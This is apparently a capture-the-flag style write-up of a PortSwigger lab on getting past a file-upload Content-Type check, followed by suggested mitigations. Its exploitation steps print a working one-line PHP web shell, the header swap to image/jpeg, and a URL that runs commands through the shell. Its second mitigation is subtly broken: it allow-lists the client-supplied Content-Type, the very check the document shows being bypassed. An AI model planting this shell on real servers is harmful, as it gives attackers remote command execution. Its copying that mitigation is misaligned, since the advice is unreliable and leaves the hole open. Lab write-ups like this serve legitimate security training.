# File Upload - Content-Type Restriction Bypass

## Lab Link
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass

## Difficulty
Apprentice

## Vulnerability Type
File Upload - Content-Type Bypass

## Theory
Many applications validate uploaded files by checking the MIME type (Content-Type header) rather than the actual file content. Attackers can bypass this by:
1. Modifying the Content-Type header to an allowed type
2. Uploading executable code with a safe MIME type
3. Server then executes the code if saved with correct extension

Example:
```
Original: Content-Type: application/x-php
Bypass: Content-Type: image/jpeg
(Upload PHP code disguised as image)
```

## Recon Process
1. Identify upload functionality
2. Test with valid file type (e.g., image.jpg)
3. Attempt uploading PHP/executable file
4. Observe error about file type
5. Intercept with Burp Suite
6. Modify Content-Type header
7. Verify execution of uploaded file

## Exploitation Steps

### Step 1: Create Malicious File
```php
<?php system($_GET['cmd']); ?>
```
Save as shell.php

### Step 2: Intercept Upload Request
Use Burp Suite to capture the upload request.

### Step 3: Modify Content-Type Header
```
Original:
Content-Type: application/x-php

Modified:
Content-Type: image/jpeg
```

### Step 4: Forward Modified Request
Server accepts upload as "image" but stores as PHP.

### Step 5: Access Uploaded File
```
URL: https://target.com/uploads/shell.php?cmd=whoami
```
Server executes PHP code.

## Root Cause
- Validation relies on client-provided Content-Type
- No server-side file type verification
- No restriction on executable file extensions
- File stored in web-accessible directory

## Impact
- **Remote Code Execution:** Execute arbitrary commands
- **Server Compromise:** Full system access
- **Data Breach:** Access sensitive files
- **Lateral Movement:** Attack other systems

## Mitigations

### 1. **Verify File Content, Not Headers**
```python
import magic

with open(uploaded_file, 'rb') as f:
    file_type = magic.from_buffer(f.read())
    if 'image' not in file_type:
        raise ValueError("Not a valid image")
```

### 2. **Whitelist Allowed Types**
```python
ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/gif']
if request.files['file'].content_type not in ALLOWED_TYPES:
    abort(400)
```

### 3. **Store Files Outside Web Root**
```
/var/www/html/  (web accessible)
/var/uploads/   (NOT web accessible)
```

### 4. **Disable Script Execution**
```apache
# .htaccess
<FilesMatch \.php$>
  Deny from all
</FilesMatch>
```

### 5. **Rename Uploaded Files**
```python
import uuid
filename = str(uuid.uuid4()) + '.jpg'
```

## Key Lesson
Never trust Content-Type headers. Always verify file content using magic bytes or dedicated libraries.
